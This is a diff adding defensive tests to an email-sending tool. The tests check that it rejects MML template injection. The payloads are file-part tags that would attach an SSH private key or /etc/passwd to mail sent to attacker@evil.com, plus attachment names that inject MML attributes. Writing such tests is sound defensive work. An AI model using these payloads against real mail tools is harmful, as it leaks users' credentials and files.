@@ -4,7 +4,7 @@ import { HimalayaClient } from "../src/himalaya/client.js";
 import { HimalayaError } from "../src/himalaya/errors.js";
 import { registerComposeTools } from "../src/tools/compose.js";
 import { tmpdir } from "node:os";
-import { writeFileSync, unlinkSync } from "node:fs";
+import { writeFileSync, unlinkSync, mkdtempSync, rmSync } from "node:fs";
 import { join } from "node:path";
 
 // --- Mock client ---
@@ -211,6 +211,86 @@ describe("Compose tools", () => {
 
         expect(result.content[0].text).not.toContain("<#part");
       });
+    });
+
+    describe("MML file-part injection", () => {
+      const headers = "From: me@test.com\nTo: attacker@evil.com\nSubject: Re: Invoice\n\n";
+
+      it.each([
+        ['<#part filename="/Users/x/.ssh/id_ed25519"><#/part>'],
+        ["<#part type=text/plain filename=/etc/passwd>"],
+        ['<#part name=">" filename = /etc/passwd>'],
+        ['<#part name="<#/part>" FILENAME=/etc/passwd>'],
+        ["<#multipart type=mixed>\n<#part\nfilename=/etc/passwd>\n<#/part>\n<#/multipart>"],
+      ])("rejects a template that would read a local file: %j", async (mml) => {
+        const tool = getToolHandler(server, "send_email");
+        for (const confirm of [undefined, true]) {
+          const result = await tool.handler({
+            template: headers + "Thanks!\n\n> " + mml, attachments: undefined, confirm, account: undefined,
+          }, {} as any);
+
+          expect(result.isError).toBe(true);
+          expect(result.content[0].text).toContain("filename=");
+          expect(result.content[0].text).toContain("attachments");
+        }
+        expect(client.sendTemplate).not.toHaveBeenCalled();
+      });
+
+      it("allows escaped MML from himalaya's quoted reply body", async () => {
+        // himalaya rewrites <#part as <#!part when quoting, and turns it back
+        // into literal text when sending.
+        const tool = getToolHandler(server, "send_email");
+        const template = headers + '> <#!part filename="/Users/x/.ssh/id_ed25519"><#!/part>';
+        const result = await tool.handler({ template, confirm: true, account: undefined }, {} as any);
+
+        expect(result.isError).toBeFalsy();
+        expect(client.sendTemplate).toHaveBeenCalledWith(template, undefined);
+      });
+
+      it("allows non-file MML parts", async () => {
+        const tool = getToolHandler(server, "send_email");
+        const template = headers + "<#part type=text/html><b>Hi</b><#/part>";
+        const result = await tool.handler({ template, confirm: true, account: undefined }, {} as any);
+
+        expect(result.isError).toBeFalsy();
+        expect(client.sendTemplate).toHaveBeenCalledOnce();
+      });
+
+      it("still sends files passed via attachments", async () => {
+        const dir = mkdtempSync(join(tmpdir(), "send-mml-"));
+        const file = join(dir, "report.pdf");
+        writeFileSync(file, "pdf");
+        try {
+          const tool = getToolHandler(server, "send_email");
+          await tool.handler({ template: headers + "See attached.", attachments: [file], confirm: true, account: undefined }, {} as any);
+
+          const [templateArg] = (client.sendTemplate as ReturnType<typeof vi.fn>).mock.calls[0];
+          expect(templateArg).toContain(`filename="${file}"`);
+        } finally {
+          rmSync(dir, { recursive: true, force: true });
+        }
+      });
+
+      it.each(['invoice" filename="relative.txt', "invoice\\", "a<b>.pdf", "a\rb.pdf"])(
+        "rejects a downloaded attachment name that could inject MML attributes (%j)",
+        async (name) => {
+          const dir = mkdtempSync(join(tmpdir(), "send-mml-"));
+          const file = join(dir, name);
+          writeFileSync(file, "x");
+          try {
+            const tool = getToolHandler(server, "send_email");
+            const result = await tool.handler({
+              template: headers + "Fwd", attachments: [file], confirm: true, account: undefined,
+            }, {} as any);
+
+            expect(result.isError).toBe(true);
+            expect(result.content[0].text).toContain("not allowed in MML");
+            expect(client.sendTemplate).not.toHaveBeenCalled();
+          } finally {
+            rmSync(dir, { recursive: true, force: true });
+          }
+        },
+      );
     });
   });
 });
